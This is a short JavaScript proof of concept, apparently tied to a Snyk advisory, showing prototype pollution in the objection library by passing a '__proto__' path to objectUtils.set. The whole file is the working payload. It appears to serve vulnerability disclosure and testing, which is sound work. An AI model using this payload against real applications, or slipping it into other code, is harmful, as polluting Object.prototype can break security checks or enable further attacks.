//https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910
 
  const objectUtils = require("objection/lib/utils/objectUtils");

   

  let obj = {};
  objectUtils.set(obj, ["__proto__", "polluted"], "yes");
// End of file
